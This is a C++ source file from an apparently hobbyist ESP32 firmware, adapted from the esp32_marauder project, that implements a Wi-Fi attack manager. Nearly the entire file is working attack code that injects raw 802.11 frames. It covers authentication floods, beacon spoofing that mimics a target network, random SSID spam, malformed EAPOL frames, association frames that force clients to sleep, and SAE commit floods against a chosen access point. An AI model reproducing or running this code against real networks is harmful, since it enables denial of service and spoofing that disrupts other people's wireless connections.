/*
 * NOCTURNE_OS — WifiAttackManager: All WiFi attack types from Marauder.
 * Adapted from esp32_marauder/WiFiScan.cpp
 */
#include "WifiAttackManager.h"
#include <esp_wifi.h>
#include <string.h>

const unsigned long WifiAttackManager::ATTACK_INTERVAL_MS = 100;

// Beacon template from Marauder
const uint8_t WifiAttackManager::BEACON_TEMPLATE[] = {
    0x80, 0x00, 0x00, 0x00,             // Frame Control, Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source address - overwritten later
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID - overwritten to the same as
                                        // the source address
    0xc0, 0x6c,                         // Seq-ctl
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // timestamp
    0x64, 0x00,                                     // Beacon interval
    0x01, 0x04,                                     // Capability info
    0x00                                            // SSID length (will be set)
};

WifiAttackManager::WifiAttackManager() {
  memset(targetBSSID_, 0, 6);
  memset(targetSSID_, 0, sizeof(targetSSID_));
  memset(apMac_, 0, 6);
  targetChannel_ = 1;
  targetSet_ = false;
}

void WifiAttackManager::begin(WifiAttackType attackType) {
  if (active_)
    stop();

  attackType_ = attackType;
  active_ = true;
  packetsSent_ = 0;
  lastSendMs_ = 0;

  // Initialize WiFi in AP mode for attacks
  WiFi.mode(WIFI_AP);
  WiFi.disconnect(true);
  delay(100);

  // Set promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(82);

  // Generate random AP MAC
  generateRandomMAC(apMac_);

  Serial.printf("[ATTACK] Started attack type %d\n", attackType);
}

void WifiAttackManager::stop() {
  if (!active_)
    return;

  active_ = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);

  Serial.println("[ATTACK] Stopped");
}

void WifiAttackManager::tick() {
  if (!active_)
    return;

  unsigned long now = millis();
  if (now - lastSendMs_ < ATTACK_INTERVAL_MS)
    return;

  lastSendMs_ = now;

  switch (attackType_) {
  case WIFI_ATTACK_AUTH:
    sendAuthFrame();
    break;
  case WIFI_ATTACK_MIMIC_FLOOD:
    sendMimicBeacon();
    break;
  case WIFI_ATTACK_AP_SPAM:
    sendAPSpamBeacon();
    break;
  case WIFI_ATTACK_BAD_MESSAGE:
  case WIFI_ATTACK_BAD_MESSAGE_TARGETED:
    sendBadMessageFrame();
    break;
  case WIFI_ATTACK_SLEEP:
  case WIFI_ATTACK_SLEEP_TARGETED:
    sendSleepFrame();
    break;
  case WIFI_ATTACK_SAE_COMMIT:
    sendSAECommitFrame();
    break;
  default:
    break;
  }
}

void WifiAttackManager::setTargetBSSID(const uint8_t *bssid) {
  if (bssid) {
    memcpy(targetBSSID_, bssid, 6);
    targetSet_ = true;
  }
}

void WifiAttackManager::setTargetSSID(const char *ssid) {
  if (ssid) {
    strncpy(targetSSID_, ssid, sizeof(targetSSID_) - 1);
    targetSSID_[sizeof(targetSSID_) - 1] = '\0';
  }
}

void WifiAttackManager::setTargetChannel(uint8_t channel) {
  if (channel >= 1 && channel <= 14)
    targetChannel_ = channel;
}

void WifiAttackManager::sendAuthFrame() {
  // Auth frame: 0xB0 (Authentication frame)
  uint8_t frame[32];
  memset(frame, 0, sizeof(frame));

  frame[0] = 0xB0; // Authentication frame
  frame[1] = 0x00;
  frame[2] = 0x3A; // Duration
  frame[3] = 0x01;

  // Destination (broadcast or target)
  if (targetSet_) {
    memcpy(frame + 4, targetBSSID_, 6);
  } else {
    memset(frame + 4, 0xFF, 6); // Broadcast
  }

  // Source (random MAC)
  generateRandomMAC(frame + 10);

  // BSSID
  if (targetSet_) {
    memcpy(frame + 16, targetBSSID_, 6);
  } else {
    memcpy(frame + 16, frame + 10, 6);
  }

  // Sequence control
  frame[22] = 0x00;
  frame[23] = 0x00;

  // Authentication algorithm (Open System = 0)
  frame[24] = 0x00;
  frame[25] = 0x00;

  // Authentication transaction sequence
  frame[26] = 0x01;
  frame[27] = 0x00;

  // Status code (Success = 0)
  frame[28] = 0x00;
  frame[29] = 0x00;

  changeChannel(targetChannel_);
  delay(1);

  esp_wifi_80211_tx(WIFI_IF_AP, frame, 30, false);
  packetsSent_++;
}

void WifiAttackManager::sendMimicBeacon() {
  if (!targetSet_ || targetSSID_[0] == '\0')
    return;

  uint8_t frame[128];
  memcpy(frame, BEACON_TEMPLATE, sizeof(BEACON_TEMPLATE));

  // Randomize source MAC
  generateRandomMAC(frame + 10);
  memcpy(frame + 16, frame + 10, 6); // BSSID = Source

  // Set SSID
  int ssidLen = strlen(targetSSID_);
  frame[36] = ssidLen;
  memcpy(frame + 37, targetSSID_, ssidLen);

  // Add supported rates and channel
  int offset = 37 + ssidLen;
  frame[offset++] = 0x01; // Supported Rates tag
  frame[offset++] = 0x08; // Length
  frame[offset++] = 0x82; // 1 Mbps
  frame[offset++] = 0x84; // 2 Mbps
  frame[offset++] = 0x8b; // 5.5 Mbps
  frame[offset++] = 0x96; // 11 Mbps
  frame[offset++] = 0x24; // 18 Mbps
  frame[offset++] = 0x30; // 24 Mbps
  frame[offset++] = 0x48; // 36 Mbps
  frame[offset++] = 0x6c; // 54 Mbps

  frame[offset++] = 0x03;           // DS Parameter Set tag
  frame[offset++] = 0x01;           // Length
  frame[offset++] = targetChannel_; // Channel

  changeChannel(targetChannel_);
  delay(1);

  esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
  packetsSent_ += 3;
}

void WifiAttackManager::sendAPSpamBeacon() {
  // Random SSID spam
  uint8_t frame[128];
  memcpy(frame, BEACON_TEMPLATE, sizeof(BEACON_TEMPLATE));

  // Randomize source MAC
  generateRandomMAC(frame + 10);
  memcpy(frame + 16, frame + 10, 6);

  // Random SSID (6 chars)
  const char alfa[] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  frame[36] = 6;
  for (int i = 0; i < 6; i++) {
    frame[37 + i] = alfa[random(62)];
  }

  // Random channel
  uint8_t ch = random(1, 12);
  changeChannel(ch);
  delay(1);

  int offset = 43;
  frame[offset++] = 0x01; // Supported Rates tag
  frame[offset++] = 0x08;
  frame[offset++] = 0x82;
  frame[offset++] = 0x84;
  frame[offset++] = 0x8b;
  frame[offset++] = 0x96;
  frame[offset++] = 0x24;
  frame[offset++] = 0x30;
  frame[offset++] = 0x48;
  frame[offset++] = 0x6c;

  frame[offset++] = 0x03; // DS Parameter Set
  frame[offset++] = 0x01;
  frame[offset++] = ch;

  esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
  packetsSent_++;
}

void WifiAttackManager::sendBadMessageFrame() {
  if (!targetSet_)
    return;

  // EAPOL bad message frame (from Marauder)
  uint8_t frame[153];
  memset(frame, 0, sizeof(frame));

  frame[0] = 0x08; // Data frame
  frame[1] = 0x02;
  frame[2] = 0x00; // Duration
  frame[3] = 0x00;

  // Destination (broadcast)
  memset(frame + 4, 0xFF, 6);

  // Source (target BSSID)
  memcpy(frame + 10, targetBSSID_, 6);

  // BSSID
  memcpy(frame + 16, targetBSSID_, 6);

  // Sequence control
  frame[22] = 0x30;
  frame[23] = 0x00;

  // LLC/SNAP
  frame[24] = 0xAA;
  frame[25] = 0xAA;
  frame[26] = 0x03;
  frame[27] = 0x00;
  frame[28] = 0x00;
  frame[29] = 0x00;
  frame[30] = 0x88;
  frame[31] = 0x8E; // EAPOL

  // 802.1X Header
  frame[32] = 0x02; // Version
  frame[33] = 0x03; // Type (Key)
  frame[34] = 0x00; // Length
  frame[35] = 0x75;

  // EAPOL-Key frame body
  frame[36] = 0x02; // Desc Type (AES/CCMP)
  frame[37] = 0x00; // Key Info
  frame[38] = 0xCA;
  frame[39] = 0x00; // Key Length
  frame[40] = 0x10;

  // Replay Counter (random)
  for (int i = 0; i < 8; i++) {
    frame[41 + i] = (packetsSent_ >> (56 - i * 8)) & 0xFF;
  }

  // Random Nonce
  for (int i = 0; i < 32; i++) {
    frame[49 + i] = esp_random() & 0xFF;
  }

  changeChannel(targetChannel_);
  delay(1);

  esp_wifi_80211_tx(WIFI_IF_AP, frame, 153, false);
  packetsSent_++;
}

void WifiAttackManager::sendSleepFrame() {
  if (!targetSet_ || targetSSID_[0] == '\0')
    return;

  // Association request with PM=1 (Power Management)
  uint8_t frame[200];
  memset(frame, 0, sizeof(frame));

  frame[0] = 0x00; // Association Request
  frame[1] = 0x10; // PM=1
  frame[2] = 0x3A; // Duration
  frame[3] = 0x01;

  // Destination (broadcast)
  memset(frame + 4, 0xFF, 6);

  // Source (random MAC)
  generateRandomMAC(frame + 10);

  // BSSID (target)
  memcpy(frame + 16, targetBSSID_, 6);

  // Sequence control
  static uint16_t seq = 0;
  frame[22] = seq & 0xFF;
  frame[23] = (seq >> 8) & 0xFF;
  seq++;

  // Capability Info (PM=1)
  frame[24] = 0x31;
  frame[25] = 0x00;

  // Listen Interval
  frame[26] = 0x0A;
  frame[27] = 0x00;

  // SSID tag
  int ssidLen = strlen(targetSSID_);
  frame[28] = 0x00; // SSID tag
  frame[29] = ssidLen;
  memcpy(frame + 30, targetSSID_, ssidLen);

  int offset = 30 + ssidLen;

  // Supported Rates
  frame[offset++] = 0x01; // Tag
  frame[offset++] = 0x04; // Length
  frame[offset++] = 0x82;
  frame[offset++] = 0x84;
  frame[offset++] = 0x8b;
  frame[offset++] = 0x96;

  // Power Capability
  frame[offset++] = 0x21; // Tag
  frame[offset++] = 0x02; // Length
  frame[offset++] = 0x01; // Min
  frame[offset++] = 0x15; // Max

  // Supported Channels
  frame[offset++] = 0x24; // Tag
  frame[offset++] = 0x02; // Length
  frame[offset++] = 0x01; // First
  frame[offset++] = 0x0D; // Last

  // RSN tag
  frame[offset++] = 0x30; // Tag
  frame[offset++] = 0x14; // Length
  frame[offset++] = 0x01;
  frame[offset++] = 0x00; // Version
  frame[offset++] = 0x00;
  frame[offset++] = 0x0F;
  frame[offset++] = 0xAC;
  frame[offset++] = 0x04; // Group cipher
  frame[offset++] = 0x01;
  frame[offset++] = 0x00; // Pairwise count
  frame[offset++] = 0x00;
  frame[offset++] = 0x0F;
  frame[offset++] = 0xAC;
  frame[offset++] = 0x04; // Pairwise cipher
  frame[offset++] = 0x01;
  frame[offset++] = 0x00; // AKM count
  frame[offset++] = 0x00;
  frame[offset++] = 0x0F;
  frame[offset++] = 0xAC;
  frame[offset++] = 0x02; // AKM suite
  frame[offset++] = 0x0C;
  frame[offset++] = 0x00; // Capabilities

  changeChannel(targetChannel_);
  delay(1);

  esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
  packetsSent_++;
}

void WifiAttackManager::sendSAECommitFrame() {
  // SAE Commit attack - simplified version
  // Full implementation requires mbedtls for ECC
  if (!targetSet_)
    return;

  uint8_t frame[64];
  memset(frame, 0, sizeof(frame));

  frame[0] = 0xB0; // Authentication frame
  frame[1] = 0x00;
  frame[2] = 0x3A;
  frame[3] = 0x01;

  // Destination
  memcpy(frame + 4, targetBSSID_, 6);

  // Source (random)
  generateRandomMAC(frame + 10);

  // BSSID
  memcpy(frame + 16, targetBSSID_, 6);

  // Sequence
  frame[22] = 0x00;
  frame[23] = 0x00;

  // Auth algorithm (SAE = 3)
  frame[24] = 0x03;
  frame[25] = 0x00;

  // SAE sequence (1)
  frame[26] = 0x01;
  frame[27] = 0x00;

  // Group (19 = ECC)
  frame[28] = 0x13;
  frame[29] = 0x00;

  changeChannel(targetChannel_);
  delay(1);

  esp_wifi_80211_tx(WIFI_IF_STA, frame, 30, false);
  packetsSent_++;
}

void WifiAttackManager::changeChannel(uint8_t channel) {
  if (channel >= 1 && channel <= 14) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }
}

void WifiAttackManager::generateRandomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  // Ensure locally administered bit is set
  mac[0] |= 0x02;
  mac[0] &= 0xFE;
}
